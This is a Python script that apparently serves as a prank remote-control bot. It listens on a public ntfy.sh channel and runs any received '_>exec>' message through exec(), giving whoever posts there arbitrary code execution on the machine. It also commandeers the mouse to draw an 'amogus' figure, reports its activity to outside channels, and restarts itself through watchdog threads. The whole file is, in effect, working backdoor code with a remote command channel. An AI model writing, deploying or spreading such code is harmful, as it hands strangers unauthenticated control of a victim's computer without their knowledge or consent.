from threading import Thread
from time import sleep
import requests as req
import datetime as dt
import os
import pyautogui as pgui
from psutil import pid_exists
import math
import json
from pynput.mouse import Button, Controller

global mouse
mouse = Controller()


global priorities
priorities = {
    'error': 1,
    'info': 1,
    'merror':3,
    'exec':2,
    'draw':2

}
global screenSize
screenSize = pgui.size()
global accuracy
accuracy=4

def circle(radius, start=0, end=360):
    print('doing circle')
    radius /= 5
    x,y = pgui.position()
    X = x
    Y = y
    # for i in range(start, end):
    #    if i%accuracy==0:
    #        pgui.dragTo(X + radius * math.cos(math.radians(i)), Y + radius * math.sin(math.radians(i)))
    for i in range(start, end):
       if i%accuracy==0:
           mouse.move(radius * math.cos(math.radians(i)), radius * math.sin(math.radians(i)))
    print('circle done')



def amogus(s=1):
    s = float(s)
    print('start')
    mouse.press(Button.left)
    mouse.move(0,25*s)
    circle(25*s/2, 0, 90)
    mouse.move(0,25 * s)
    circle(25*s/2, 90, 180)
    mouse.move(0,-75*s)
    mouse.move(0,100*s)
    circle(25/2 * s, 90, 270)
    circle(25/2 * s, 90, 270)
    mouse.move(0,-50*s)
    circle(25/2*s, 180,360)
    mouse.move(10,0)
    circle(25 / 2 * s, 0, 180)
    mouse.move(-10,0)
    mouse.release(Button.left)
    mouse.move(0,25)
    mouse.press(Button.left)
    circle(25 / 2 * s, 270, 360)
    mouse.release(Button.left)
    print('done')
    sleep(0.1)
    mouse.release(Button.left)
    #pgui.moveTo(X + R * math.cos(math.radians(i)), Y + R * math.sin(math.radians(i)))



global patterns
patterns = {
    'amogus': amogus
}
def draw(pattern, x=screenSize[0]/2, y=screenSize[1]/2, s=1):
    try:
        x=float(x)
        y=float(y)
        curX, curY = pgui.position()
        if x == -1: x=curX
        elif x == -2: x = screenSize[0] / 2
        if y == -1: y=curY
        elif y==-2: y=screenSize[1]/2
        x=max(200,x)
        y=max(200,y)
        print(f'{pattern=}, {x=}:{y=}')
        if pattern in patterns.keys():
            send(f'Drawing {pattern} at {x}:{y}', 'Draw', priorities['draw'])
            pgui.moveTo(x, y)
            patterns[pattern](s)
        else: send(f'No such pattern "{pattern}", list={patterns.keys()}', 'DrawError', priorities['draw'])
    except Exception as e:
        send(f'Exception: {e} @draw', 'error', priorities['error'])

global mainpid
mainpid=0

def threadrun(func, daemon=True):
    th=Thread(target=func, daemon=daemon).start()
    send(f'Started thread {func.__name__}', '', priorities['info'])

def gettime():
    return dt.datetime.now().strftime("%d/%m/%Y %H:%M:%S")

def send(msg, title='', priority=1, channel='https://ntfy.sh/amogoos-OUT'):
    try:
        req.post(channel,
                      data=f'{msg}',
                      headers={
                          "Title": f'{title}',
                          "Priority": f'{priority}',
                      })
    except UnicodeEncodeError: send('Text contains cyrillic', 'Error sending a msg', priorities['error'])

def ntfylisten(channel='https://ntfy.sh/amogoos-IN'):
    resp = req.get(channel+'/json', stream=True)
    for line in resp.iter_lines():
        if line:
            msghandle(json.loads(line))

def dexec(cmd):
    try:
        send(f'Executing {cmd}', 'Exec', priorities['exec'])
        exec(cmd)
    except KeyboardInterrupt: raise KeyboardInterrupt
    except Exception as e:
        send(f'Error during exec {e}', 'ExecError', priorities['error'])

def msghandle(msg):
    try:
        if msg['event'] == 'message':
            print(msg)
            send(f"Received '{msg['message']}'", 'test', priorities['info'], 'https://ntfy.sh/amogoos-UPDOWN')
            msg = msg['message']
            print(msg)
            if msg[0] == '_':
                if msg.split('>')[1] == 'exec':
                    cmd = ''.join(msg.split('>')[2:])
                    dexec(cmd)
                if msg.split('>')[1] == 'draw':
                    drw = ''.join(msg.split('>')[2:])
                    if '/' in drw:
                        x,y,s = drw.split('/')[1:]
                    pat = drw.split('/')[0]
                    print(f'{pat=}, {x=}:{y=}({s=})')
                    draw(pat,x,y,s)
    except KeyboardInterrupt: raise KeyboardInterrupt
    except Exception as e: send(f'Exception: {e} @msghandle', 'error', priorities['error'])


def updown():
    sleep(3)
    while True:
        if pid_exists(mainpid):
            pass
            #send('Still alive', '', 1, 'https://ntfy.sh/amogoos-UPDOWN')
        else:
            send('Process dead!', '', priorities['merror'])
            threadrun(main, False)
        sleep(15)



threadrun(updown, False)
threadrun(ntfylisten)
def main():
    mainpid = os.getpid()
    print('main alive')
    while True: pass
    print('main dead')

threadrun(main, False)

print('Good luck, amogoos')
while True: pass